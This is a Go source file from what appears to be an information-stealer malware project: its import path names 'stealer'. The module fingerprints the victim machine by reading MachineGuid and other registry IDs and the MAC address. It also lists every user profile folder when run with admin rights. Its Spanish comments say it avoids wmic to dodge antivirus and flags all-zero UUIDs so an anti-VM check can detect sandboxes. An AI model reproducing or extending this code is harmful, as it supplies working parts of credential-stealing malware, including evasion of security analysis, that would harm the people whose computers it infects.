package hardware

import (
	"bytes"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	"github.com/aqua/stealer/utils/program"
	"github.com/shirou/gopsutil/v3/disk"
	"golang.org/x/sys/windows/registry"
)

// GetHWID — lee el UUID del producto via WMI registry (sin exec/wmic).
// Si el valor es todo ceros, retorna error para que antivm lo detecte como sandbox.
func GetHWID() (string, error) {
	// Intentar via registry directo (no wmic — wmic es flaggeado por AV)
	hwid, err := hwidFromRegistry()
	if err == nil && !isZeroUUID(hwid) {
		return hwid, nil
	}
	// Fallback: WMI via COM (NtQuerySystemInformation no aplica aquí)
	// Si ambos fallan o dan UUID cero → sandbox conocida
	if isZeroUUID(hwid) {
		return hwid, fmt.Errorf("sandbox HWID detected: %s", hwid)
	}
	return "", fmt.Errorf("HWID not found")
}

func hwidFromRegistry() (string, error) {
	// HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid — alternativa real
	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Cryptography`,
		registry.QUERY_VALUE|registry.WOW64_64KEY)
	if err == nil {
		defer k.Close()
		v, _, e := k.GetStringValue("MachineGuid")
		if e == nil && len(v) > 0 {
			return strings.ToUpper(v), nil
		}
	}

	// HKLM\SYSTEM\CurrentControlSet\Control\SystemInformation — ComputerHardwareId
	k2, err2 := registry.OpenKey(registry.LOCAL_MACHINE,
		`SYSTEM\CurrentControlSet\Control\SystemInformation`,
		registry.QUERY_VALUE)
	if err2 == nil {
		defer k2.Close()
		v, _, e := k2.GetStringValue("ComputerHardwareId")
		if e == nil && len(v) > 0 {
			return strings.ToUpper(strings.Trim(v, "{}")), nil
		}
	}

	// HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion — ProductId
	k3, err3 := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows NT\CurrentVersion`,
		registry.QUERY_VALUE)
	if err3 == nil {
		defer k3.Close()
		v, _, e := k3.GetStringValue("ProductId")
		if e == nil && len(v) > 0 {
			return v, nil
		}
	}

	return "00000000-0000-0000-0000-000000000000", fmt.Errorf("all HWID sources failed")
}

func isZeroUUID(uuid string) bool {
	clean := strings.ReplaceAll(strings.ToUpper(uuid), "-", "")
	clean = strings.Trim(clean, "{} ")
	for _, c := range clean {
		if c != '0' {
			return false
		}
	}
	return len(clean) > 0
}

// GetMAC — usa GetAdaptersInfo directo via iphlpapi (sin net.Interfaces que usa CGo).
func GetMAC() (string, error) {
	// Primer intento: net.Interfaces (más portable)
	interfaces, err := net.Interfaces()
	if err == nil {
		for _, i := range interfaces {
			if i.Flags&net.FlagUp != 0 && i.Flags&net.FlagLoopback == 0 &&
				!bytes.Equal(i.HardwareAddr, nil) && len(i.HardwareAddr) == 6 {
				return i.HardwareAddr.String(), nil
			}
		}
	}

	// Fallback: iphlpapi.GetAdaptersInfo directo
	return macFromAdaptersInfo()
}

type ipAdapterInfoRaw struct {
	Next            uintptr
	ComboIndex      uint32
	AdapterName     [260]byte
	Description     [132]byte
	AddressLength   uint32
	Address         [8]byte
	Index           uint32
	Type            uint32
	DhcpEnabled     uint32
	CurrentIpAddress uintptr
	IpAddressList   [96]byte
	GatewayList     [96]byte
	DhcpServer      [96]byte
	HaveWins        bool
	_               [3]byte
	PrimaryWinsServer [96]byte
	SecondaryWinsServer [96]byte
	LeaseObtained   int64
	LeaseExpires    int64
}

var iphlpapi = syscall.NewLazyDLL("iphlpapi.dll")

func macFromAdaptersInfo() (string, error) {
	getAdaptersInfo := iphlpapi.NewProc("GetAdaptersInfo")
	var size uint32 = 0
	getAdaptersInfo.Call(0, uintptr(unsafe.Pointer(&size)))
	if size == 0 {
		return "", fmt.Errorf("GetAdaptersInfo size 0")
	}
	buf := make([]byte, size)
	r, _, _ := getAdaptersInfo.Call(uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)))
	if r != 0 {
		return "", fmt.Errorf("GetAdaptersInfo error: %d", r)
	}
	ai := (*ipAdapterInfoRaw)(unsafe.Pointer(&buf[0]))
	for ai != nil {
		if ai.AddressLength == 6 {
			mac := fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x",
				ai.Address[0], ai.Address[1], ai.Address[2],
				ai.Address[3], ai.Address[4], ai.Address[5])
			return mac, nil
		}
		if ai.Next == 0 {
			break
		}
		ai = (*ipAdapterInfoRaw)(unsafe.Pointer(ai.Next))
	}
	return "", fmt.Errorf("no MAC found")
}

// GetUsers — devuelve paths de todos los usuarios
// Si tenemos admin, itera todos los drives; si no, solo el usuario actual
func GetUsers() []string {
	if !program.IsElevated() {
		return []string{os.Getenv("USERPROFILE")}
	}

	var users []string
	drives, err := disk.Partitions(false)
	if err != nil {
		return []string{os.Getenv("USERPROFILE")}
	}

	for _, drive := range drives {
		files, err := os.ReadDir(fmt.Sprintf("%s//Users", drive.Mountpoint))
		if err != nil {
			continue
		}
		for _, file := range files {
			if !file.IsDir() {
				continue
			}
			users = append(users, filepath.Join(fmt.Sprintf("%s//Users", drive.Mountpoint), file.Name()))
		}
	}

	if len(users) == 0 {
		return []string{os.Getenv("USERPROFILE")}
	}
	return users
}
